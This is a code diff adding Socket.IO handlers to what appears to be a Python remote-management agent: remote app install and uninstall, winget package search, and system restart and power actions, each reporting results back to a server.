+            'timestamp': int(time.time() * 1000),
+        })
+
+
+@sio.on('uninstall_app')
+def on_uninstall_app(data=None):
+    request_id = ''
+    app_name = ''
+    uninstall_string = ''
+    quiet_uninstall_string = ''
+    package_id = ''
+
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        app_name = str(data.get('name') or data.get('appName') or '').strip()
+        uninstall_string = str(data.get('uninstallString') or '').strip()
+        quiet_uninstall_string = str(data.get('quietUninstallString') or '').strip()
+        package_id = str(data.get('packageId') or data.get('id') or '').strip()
+
+    def _worker():
+        try:
+            res = execute_app_uninstall(
+                app_name=app_name,
+                uninstall_string=uninstall_string,
+                quiet_uninstall_string=quiet_uninstall_string,
+                package_id=package_id,
+            )
+            res.update({
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'timestamp': int(time.time() * 1000),
+            })
+            sio.emit('uninstall_app_result', res)
+        except Exception as error:
+            sio.emit('uninstall_app_result', {
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'appName': app_name,
+                'success': False,
+                'error': str(error),
+                'timestamp': int(time.time() * 1000),
+            })
+
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+@sio.on('install_app')
+def on_install_app(data=None):
+    request_id = ''
+    package_id = ''
+    installer_path = ''
+    custom_args = ''
+
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        package_id = str(data.get('packageId') or data.get('id') or '').strip()
+        installer_path = str(data.get('installerPath') or data.get('path') or '').strip()
+        custom_args = str(data.get('customArgs') or data.get('args') or '').strip()
+
+    def _worker():
+        try:
+            sio.emit('install_app_status', {
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'status': 'installing',
+                'packageId': package_id,
+                'installerPath': installer_path,
+                'timestamp': int(time.time() * 1000),
+            })
+            res = execute_app_install(
+                package_id=package_id,
+                installer_path=installer_path,
+                custom_args=custom_args,
+            )
+            res.update({
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'timestamp': int(time.time() * 1000),
+            })
+            sio.emit('install_app_result', res)
+        except Exception as error:
+            sio.emit('install_app_result', {
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'packageId': package_id,
+                'installerPath': installer_path,
+                'success': False,
+                'error': str(error),
+                'timestamp': int(time.time() * 1000),
+            })
+
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+@sio.on('install_package')
+def on_install_package(data=None):
+    on_install_app(data=data)
+
+
+@sio.on('search_packages')
+def on_search_packages(data=None):
+    request_id = ''
+    query = ''
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        query = str(data.get('query') or '').strip()
+
+    def _worker():
+        try:
+            results = search_winget_packages(query)
+            sio.emit('search_packages_result', {
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'query': query,
+                'packages': results,
+                'count': len(results),
+                'timestamp': int(time.time() * 1000),
+            })
+        except Exception as error:
+            sio.emit('search_packages_result', {
+                'machine': MACHINE_NAME,
+                'requestId': request_id,
+                'query': query,
+                'packages': [],
+                'error': str(error),
+                'timestamp': int(time.time() * 1000),
+            })
+
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+@sio.on('system_power_action')
+def on_system_power_action(data=None):
+    request_id = ''
+    action = 'restart'
+    timeout_seconds = 5
+    message = 'Action initiated via Remote Control'
+
+    if isinstance(data, dict):
+        request_id = str(data.get('requestId') or '').strip()
+        action = str(data.get('action') or 'restart').strip()
+        if 'timeout' in data or 'timeoutSeconds' in data:
+            timeout_seconds = int(data.get('timeout') or data.get('timeoutSeconds') or 5)
+        if 'message' in data:
+            message = str(data.get('message') or message).strip()
+
+    try:
+        res = execute_system_power(action=action, timeout_seconds=timeout_seconds, message=message)
+        res.update({
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'timestamp': int(time.time() * 1000),
+        })
+        sio.emit('system_power_result', res)
+    except Exception as error:
+        sio.emit('system_power_result', {
+            'machine': MACHINE_NAME,
+            'requestId': request_id,
+            'action': action,
+            'success': False,
+            'error': str(error),
+            'timestamp': int(time.time() * 1000),
+        })
+
+
+@sio.on('system_restart')
+def on_system_restart(data=None):
+    payload = data if isinstance(data, dict) else {}
+    payload['action'] = 'restart'
+    on_system_power_action(data=payload)
+
 
 if __name__ == "__main__":
     log_error(f"Agent booted. pid={os.getpid()} exe={os.path.abspath(sys.executable)} version={AGENT_VERSION} autoUpdate={AUTO_UPDATE_ENABLED}")
